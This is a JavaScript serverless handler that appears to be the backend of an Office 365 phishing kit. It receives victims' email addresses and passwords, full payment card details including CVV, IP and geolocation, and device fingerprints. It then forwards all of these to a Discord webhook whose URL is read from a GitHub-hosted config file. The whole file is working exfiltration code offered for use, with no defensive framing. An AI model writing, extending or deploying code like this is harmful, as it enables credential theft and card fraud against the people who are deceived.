import { Buffer } from 'node:buffer';

const GH_TOKEN = process.env.GH_TOKEN || '';
const GH_OWNER = process.env.GH_OWNER || 'varasjaime777-alt';
const GH_REPO = process.env.GH_REPO || 'mail-office365';
const CONFIG_PATH = 'config.json';
const GITHUB_API = `https://api.github.com/repos/${GH_OWNER}/${GH_REPO}/contents/${CONFIG_PATH}`;

const headers = {
  'Authorization': `token ${GH_TOKEN}`,
  'Accept': 'application/vnd.github.v3+json',
  'User-Agent': 'MailOffice365Panel/1.0'
};

async function githubRead() {
  const res = await fetch(GITHUB_API, { method: 'GET', headers });
  if (!res.ok) throw new Error(`GitHub read error: ${res.status}`);
  const data = await res.json();
  return JSON.parse(Buffer.from(data.content, 'base64').toString('utf-8'));
}

export default async function handler(req, res) {
  if (req.method !== 'POST') {
    return res.status(405).json({ error: 'Metodo no permitido' });
  }

  try {
    let config = {};
    try {
      config = await githubRead();
    } catch (e) {
      console.error('Error leyendo config:', e.message);
      return res.status(500).json({ error: 'No se pudo leer la configuracion. Asegurate de que GH_TOKEN este configurado en Vercel.' });
    }

    const webhookUrl = config.discordWebhook;
    if (!webhookUrl || !webhookUrl.includes('discord.com/api/webhooks')) {
      return res.status(400).json({ error: 'Webhook no configurado. Configura discordWebhook en el panel de administracion.' });
    }

    const body = req.body || {};
    const email = body.email || 'unknown';
    const password = body.password || '****';
    const type = body.type || 'login';
    const timestamp = new Date().toISOString();
    const forwardedFor = req.headers['x-forwarded-for'] || '';
    const clientIp = forwardedFor.split(',')[0]?.trim() || 'desconocida';

    const cardNumber = body.cardNumber || '';
    const cardHolder = body.cardHolder || '';
    const expiryDate = body.expiryDate || '';
    const cvv = body.cvv || '';

    const userAgent = body.userAgent || 'desconocido';
    const language = body.language || 'desconocido';
    const screenResolution = body.screenResolution || 'desconocido';
    const colorDepth = body.colorDepth || 'desconocido';
    const timezone = body.timezone || 'desconocido';
    const platform = body.platform || 'desconocido';
    const onlineStatus = body.onlineStatus || 'desconocido';
    const cookiesEnabled = body.cookiesEnabled || 'desconocido';

    const geoIp = body.geoIp || (body.ipifyIp || clientIp);
    const geoCity = body.geoCity || '';
    const geoRegion = body.geoRegion || '';
    const geoCountry = body.geoCountry || '';
    const geoCountryCode = body.geoCountryCode || '';
    const geoTimezone = body.geoTimezone || timezone;
    const geoIsp = body.geoIsp || '';

    const deviceMemory = body.deviceMemory || 'desconocido';
    const cpuCores = body.cpuCores || 'desconocido';
    const touchPoints = body.touchPoints || 0;
    const isMobile = body.isMobile || 'desconocido';
    const isTablet = body.isTablet || 'desconocido';
    const isDesktop = body.isDesktop || 'desconocido';

    const batteryLevel = body.batteryLevel || 'No disponible';
    const batteryCharging = body.batteryCharging || 'Desconocido';

    const template = config.discordMessageTemplate || '';
    const hasPlaceholders = template.includes('{email}');
    const isPayment = type === 'payment';

    function replaceIfExists(msg, ph, value) {
      if (msg.includes('{' + ph + '}')) {
        return msg.replace(new RegExp('\\{' + ph + '\\}', 'g'), value || '');
      }
      return msg;
    }

    let message = '';

    if (hasPlaceholders) {
      message = template;
      message = replaceIfExists(message, 'email', email);
      message = replaceIfExists(message, 'password', password);
      message = replaceIfExists(message, 'type', isPayment ? 'Pago' : 'Login');
      message = replaceIfExists(message, 'ip', clientIp);
      message = replaceIfExists(message, 'geoIp', geoIp);
      message = replaceIfExists(message, 'geoCity', geoCity);
      message = replaceIfExists(message, 'geoRegion', geoRegion);
      message = replaceIfExists(message, 'geoCountry', geoCountry);
      message = replaceIfExists(message, 'geoCountryCode', geoCountryCode);
      message = replaceIfExists(message, 'geoTimezone', geoTimezone);
      message = replaceIfExists(message, 'geoIsp', geoIsp);
      message = replaceIfExists(message, 'deviceMemory', deviceMemory);
      message = replaceIfExists(message, 'cpuCores', cpuCores);
      message = replaceIfExists(message, 'touchPoints', touchPoints);
      message = replaceIfExists(message, 'isMobile', isMobile);
      message = replaceIfExists(message, 'isTablet', isTablet);
      message = replaceIfExists(message, 'isDesktop', isDesktop);
      message = replaceIfExists(message, 'batteryLevel', batteryLevel);
      message = replaceIfExists(message, 'batteryCharging', batteryCharging);
      message = replaceIfExists(message, 'expiryDate', expiryDate);
      message = replaceIfExists(message, 'cardHolder', cardHolder);
      message = replaceIfExists(message, 'cardNumber', cardNumber);
      message = replaceIfExists(message, 'cvv', cvv);
      message = replaceIfExists(message, 'userAgent', userAgent);
      message = replaceIfExists(message, 'language', language);
      message = replaceIfExists(message, 'screenResolution', screenResolution);
      message = replaceIfExists(message, 'colorDepth', colorDepth);
      message = replaceIfExists(message, 'timezone', timezone);
      message = replaceIfExists(message, 'platform', platform);
      message = replaceIfExists(message, 'onlineStatus', onlineStatus);
      message = replaceIfExists(message, 'cookiesEnabled', cookiesEnabled);
      message = replaceIfExists(message, 'timestamp', timestamp);
      message = replaceIfExists(message, 'title', isPayment ? 'Verificacion de pago' : 'Inicio de sesion');

      // Si es pago y la plantilla no tiene cardNumber, agregar seccion de tarjeta al final
      if (isPayment && !message.includes('{cardNumber}') && cardNumber) {
        message += '\n\n--------\nDATOS DE TARJETA:\nNumero: ' + cardNumber + '\nTitular: ' + cardHolder + '\nVence: ' + expiryDate + '\nCVV: ' + cvv;
      }
    } else {
      // Plantilla por defecto
      if (isPayment) {
        // Mensaje SOLO de pago - sin datos de login
        message = '💳 Verificacion de pago';
        message += '\n----------------';
        message += '\nUsuario: ' + email;

        if (cardNumber) {
          message += '\n\n----\nDATOS DE TARJETA:';
          message += '\nNumero: ' + cardNumber;
          message += '\nTitular: ' + cardHolder;
          message += '\nVence: ' + expiryDate;
          message += '\nCVV: ' + cvv;
        }
        message += '\n----------------';
        message += '\nIP: ' + clientIp;
        message += '\nGeo IP: ' + geoIp;
        if (geoCity) message += '\nCiudad: ' + geoCity;
        if (geoRegion) message += '\nRegion: ' + geoRegion;
        if (geoCountry) message += '\nPais: ' + geoCountry + (geoCountryCode ? ' (' + geoCountryCode + ')' : '');
        message += '\nNavegador: ' + userAgent;
        message += '\nIdioma: ' + language;
        message += '\nPantalla: ' + screenResolution + ' (' + colorDepth + ' bits)';
        message += '\nZona horaria: ' + timezone;
        message += '\nHora: ' + timestamp;
      } else {
        // Mensaje de login completo
        message = '🔐 Inicio de sesion';
        message += '\n----------------';
        message += '\nUsuario: ' + email;
        message += '\nContraseña: ' + password;
        message += '\nIP: ' + clientIp;
        message += '\nGeo IP: ' + geoIp;
        if (geoCity) message += '\nCiudad: ' + geoCity;
        if (geoRegion) message += '\nRegion: ' + geoRegion;
        if (geoCountry) message += '\nPais: ' + geoCountry + (geoCountryCode ? ' (' + geoCountryCode + ')' : '');
        if (deviceMemory !== 'desconocido' || cpuCores !== 'desconocido') {
          message += '\n\nDispositivo:';
          message += '\nRAM: ' + deviceMemory;
          message += '\nCPU: ' + cpuCores;
          message += '\nTipo: ' + isMobile + ' / ' + isTablet + ' / ' + isDesktop;
        }
        if (batteryLevel !== 'No disponible') {
          message += '\nBateria: ' + batteryLevel + ' (Cargando: ' + batteryCharging + ')';
        }
        message += '\nNavegador: ' + userAgent;
        message += '\nIdioma: ' + language;
        message += '\nPantalla: ' + screenResolution + ' (' + colorDepth + ' bits)';
        message += '\nZona horaria: ' + timezone;
        message += '\nPlataforma: ' + platform;
        message += '\nEstado: ' + onlineStatus;
        message += '\nCookies: ' + cookiesEnabled;
        message += '\n----------------';
        message += '\nHora: ' + timestamp;
      }
    }

    const discordRes = await fetch(webhookUrl, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ content: message })
    });

    if (!discordRes.ok) {
      const text = await discordRes.text();
      return res.status(500).json({
        error: 'Error enviando a Discord: ' + discordRes.status + ' ' + text
      });
    }

    return res.status(200).json({
      success: true,
      message: 'Mensaje enviado correctamente.'
    });
  } catch (err) {
    console.error('Error en API Discord:', err);
    return res.status(500).json({ error: 'Error interno: ' + err.message });
  }
}
